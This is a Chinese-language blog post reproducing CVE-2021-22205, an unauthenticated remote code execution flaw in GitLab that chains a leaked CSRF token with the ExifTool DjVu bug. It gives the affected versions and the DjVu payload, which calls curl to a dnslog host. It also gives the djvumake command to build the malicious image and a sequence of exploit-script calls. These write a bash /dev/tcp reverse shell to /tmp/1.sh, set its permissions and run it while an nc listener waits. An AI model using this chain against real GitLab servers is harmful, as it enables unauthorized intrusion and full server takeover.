---
title: GitLab 未授权RCE(CVE-2021-22205)  --花无名   
layout: mypost
categories: [漏洞复现]
---
# 1.漏洞介绍

这个漏洞形成未授权RCE主要要两个原因：1.gitlab的用户登录界面的CSRF-token泄露，攻击者可以直接获取使用至系统文件上传接口，导致原本需要登录后才能实现RCE的漏洞风险大大提高了

2.第二个原因是gitlab使用的exiftool，接收用户上传图片时，处理不当，将用户上传的无法解析的文件进行执行，从而导致了可RCE（CVE-2021-22204），[详情见vakzz大佬原文](https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html)

# 2.未授权漏洞复现：

`影响范围：`

`11.9 <=  GitLab（CE/EE）< 13.8.8
13.9 <=  GitLab（CE/EE）< 13.9.6
13.10 <= GitLab（CE/EE）< 13.10.3`

过程：

直接访问接口 http://xxxx.com/users/sign_in

在返回包中找到csr![微信截图_20211112140906](微信截图_20211112140906.png)f-token，将值记录



构造数据包，上传文件

![tihuan](tihuan.png)

即可未授权上传文件至目标服务器

# 文件上传RCE

根据上述漏洞原理可知，我们需要构造一个非常规的图片文件，从而使系统解析错误并执行文件内容

此处需要上传`DjVu`格式图片（即Exp）

![attfile](attfile.png)

DjVu格式图片需要下载安装工具DjVuLibre，地址：http://djvu.sourceforge.net/

木马文本内容

`(metadata (Copyright "\ " . qx{curl xxxx.dnslog.cn} . \ " b ") )`

使用命令生成rce.jpg

`djvumake rce.djvu INFO=0,0 BGjp=/dev/null ANTa=rce.txt && mv rce.djvu rce.jpg`

之后上传至系统服务器即可

![image-20211112143405506](image-20211112143405506.png)

至此即可查看dnslog是否有成功访问记录了

# 脚本复现及漏洞利用

这里使用脚本为：https://github.com/Al1ex/CVE-2021-22205 详细工具介绍可直接至github查看。

NC反弹shell

构造语句，将命令写入到服务器，执行写入的文件，即可成功反弹shell

` python3 CVE-2021-22205.py -a true -t http://192.168.195.142:8080/ -c "echo 'bash -i >& /dev/tcp/xx.xx.x.x/6666 0>&1' > /tmp/1.sh"`

![fan1](fan1.png)

可看到文件已成功写到靶机上

![ubantu](ubantu.png)

`python3 CVE-2021-22205.py -a true -t http://192.168.195.142:8080/ -c "chmod 7777 /tmp/1.sh"`

![fan2](fan2.png)

`nc -lvp 6666`

`python3 CVE-2021-22205.py -a true -t http://192.168.195.142:8080/ -c "/bin/bash /tmp/1.sh"`

![image-20211112144237872](image-20211112144237872.png)

![shell](shell.png)



参考：https://github.com/Al1ex/CVE-2021-22205     https://www.freebuf.com/articles/web/303375.html